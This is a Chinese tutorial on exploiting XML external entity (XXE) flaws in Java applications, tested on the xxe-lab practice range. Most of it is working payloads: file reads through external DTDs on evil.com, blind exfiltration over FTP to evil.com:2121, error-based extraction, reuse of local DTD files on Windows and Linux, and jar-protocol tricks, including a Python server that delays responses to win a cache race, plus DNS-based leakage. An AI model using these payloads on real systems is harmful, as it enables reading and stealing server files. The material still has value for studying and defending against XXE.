一，前言


阅读此文章之前建议阅读《XXE》

原文对于javaxxe居然一句话就略过了——【除此之外，在java环境中，换行文件用ftp协议外带更容易】，这篇文章是对其的补充。

靶场环境同样用

https://github.com/c0ny1/xxe-lab

php的xxe在php5.4版本之后少见了，是因为libxml在2.9.1之后默认关闭外部实体，这个在我以前的文章有提及。

但java的XXE还是非常常见的，以下是java和php支持协议的不同。


PHP：file/http/ftp/php/compress.zlib/compress.bzip2/data/glob/phar
PHP扩展openssl：https/ftps    
PHP扩展zip：zip
PHP扩展ssh2：ssh2.shell/ssh2.exec/ssh2.tunnel/ssh2.sftp/ssh2.scp
PHP扩展rar：rar
PHP扩展oggvorbis：ogg
PHP扩展expect ：expect             
Java：http/https/ftp/file/jar/netdoc/mailto/gopher(仅限低版本)
.NET：file/http/https/ftp


回显XXE进行任意文件读取，http/ftp协议探测内网，这些一般的利用方法都没什么区别。


二，CDATA拼接


java dtd在外部拼接CDATA，在java中无法绕过【&】和【%】

请求

<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE roottag [<!ENTITY % start "<![CDATA[">   <!ENTITY % goodies SYSTEM "file:///C:/test.txt">  <!ENTITY % end "]]>">  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd"> %dtd; ]> <user><username>&all;</username><password>admin</password></user>

dtd

<!ENTITY all "%start;%goodies;%end;">



三，netdoc协议


java中存在一个netdoc协议，在大部分情况下可代替file

<?xml version="1.0"?><!DOCTYPE GVI[<!ENTITY xxe SYSTEM "netdoc:///C:/windows/win.ini" >]><user><username>&xxe;</username><password>admin</password></user>



四，ftp协议带出



对于不回显XXE，java没法像php一样用php://filter用来编码文件，只能用http或者ftp带出，受到很大限制。http不用多说，ftp方式如下。

请求

<?xml version="1.0"?><!DOCTYPE GVI [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><user><username>admin</username><password>admin</password></user>

dtd

<!ENTITY % all SYSTEM "file:///C:/test.txt"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'ftp://evil.com:2121/%all;'>">%eval;%error;

此时无法直接使用nc监听2121端口，需要用到伪ftp服务器

https://github.com/LandGrey/xxe-ftp-server/

python xxe-ftp-server.py 0.0.0.0 8081 2121

ftp协议可获取java版本，但很多特殊字符都会导致无法带出，同时JDK大于7u141和8u162版本无法带出有换行的文件。


五，dtd报错带出


如果存在堆栈报错，可以拼接在不存在file地址引发报错来获取回显(php也可以用这种方法)。
 dtd稍微改一下即可

<!ENTITY % all SYSTEM "file:///c:/windows/win.ini"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%all;'>">%eval;%error;



六，本地dtd


如果无法使用外部dtd(比如不通外网)，这样内部无法拼接实体，需要用到本地dtd。
有实体满足<!ENTITY % XXX "XXX">，后面再被%XXX;引用即可。
比如windows存在C:/Windows/System32/wbem/xml/cim20.dtd

<?xml version="1.0" ?><!DOCTYPE message [    <!ENTITY % local_dtd SYSTEM "file:///C:/Windows/System32/wbem/xml/cim20.dtd">    <!ENTITY % SuperClass '>        <!ENTITY &#x25; file SYSTEM "file:///c:/windows/win.ini">        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">        &#x25;eval;        &#x25;error;        '>    %local_dtd;]><user><username>admin</username><password>admin</password></user>


同理，加载了本地dtd也可以用ftp协议外带符合条件的文件。


Windows上常用dtd
C:/Windows/System32/wbem/xml/cim20.dtd
C:/Windows/System32/wbem/xml/wmi20.dtd
C:/Windows/SysWOW64/wbem/xml/cim20.dtd
C:/Windows/SysWOW64/wbem/xml/wmi20.dtd

linux系统中dtd文件视系统而定，比如从我的Ubuntu中找出文件
/usr/share/xml/fontconfig/fonts.dtd
constant可利用。

<!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'><!ELEMENT patelt (%constant;)*>

需要圆括号来闭合

<?xml version="1.0" ?><!DOCTYPE message [    <!ENTITY % local_dtd SYSTEM "file:///C:/fonts.dtd">    <!ENTITY % constant 'aaa)>        <!ENTITY &#x25; file SYSTEM "file:///c:/windows/win.ini">        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">        &#x25;eval;        &#x25;error;        '>    %local_dtd;]><user><username>admin</username><password>admin</password></user>



七，jar协议远程加载


jar协议可以用来读取zip格式文件(包括jar包)中的内容，也可以引用zip格式文件中的dtd

<?xml version="1.0"?><!DOCTYPE GVI [<!ENTITY xxe SYSTEM "jar:file:///C:/test.zip!/test.txt" >]><user><username>&xxe;</username><password>admin</password></user>



jar协议也支持远程加载zip文件，并且会在缓存目录生成一个文件，可用于条件竞争。确定缓存文件位置可将test.txt换成不存在的文件使其报错即可。
Windows路径为C:\Windows\TEM\jar_cache6484036165340851953.tmp

由于文件存活时间较短，可以在evil.com上延迟响应时间

import sys import time import threadingimportsocketserver from urllib.parseimport quote import http.clientas httpc  listen_host = 'localhost'listen_port = 9999jar_file = sys.argv[1] class JarRequestHandler(socketserver.BaseRequestHandler):      def handle(self):        http_req = b''        print('Newconnection:',self.client_address)        while b'\r\n\r\n'not in http_req:            try:                http_req +=self.request.recv(4096)                print('Clientreq:\r\n',http_req.decode())                jf = open(jar_file,'rb')                contents = jf.read()                headers =('''HTTP/1.0 200 OK\r\n'''                '''Content-Type:application/java-archive\r\n\r\n''')                self.request.sendall(headers.encode('ascii'))                 self.request.sendall(contents[:-1])                time.sleep(30)                print(30)                self.request.sendall(contents[-1:])             except Exceptionas e:                print ("geterror at:"+str(e))  if __name__== '__main__':     jarserver = socketserver.TCPServer((listen_host,listen_port),JarRequestHandler)     print ('waitingfor connection...')     server_thread = threading.Thread(target=jarserver.serve_forever)    server_thread.daemon= True     server_thread.start()    server_thread.join()

八，jar协议报错


如果存在报错，jar协议可以利用报错列目录，同理也可以带出单个文件内容
请求

<?xml version="1.0"?><!DOCTYPE GVI [<!ENTITY % payload SYSTEM "file:///C:/"><!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd" >%xxe;%release;]><user><username>admin</username><password>admin</password></user>

dtd

<!ENTITY % nested "<!ENTITY &#x25; release SYSTEM 'jar:%payload;!/test'>">%nested;



九，jar协议dnslog带出


jar协议还可能以dnslog形式读取文件或者目录(未复现成功)

<?xml version="1.0" encoding="UTF-8"?>    <!DOCTYPE foo [        <!ENTITY % payload SYSTEM "file:///etc">        <!ENTITY % dtd SYSTEM "http://externallyhostedentity.com/a.dtd>        %dtd;        %release;    ]>


<!ENTITY % nested "<!ENTITY % release SYSTEM ’jar:%payload;.externallyhostedentity.com!/’>">%nested;

或者

<!ENTITY % nested "<!ENTITY % release SYSTEM ’jar:%payload;/externallyhostedentity.com!/’>">%nested;
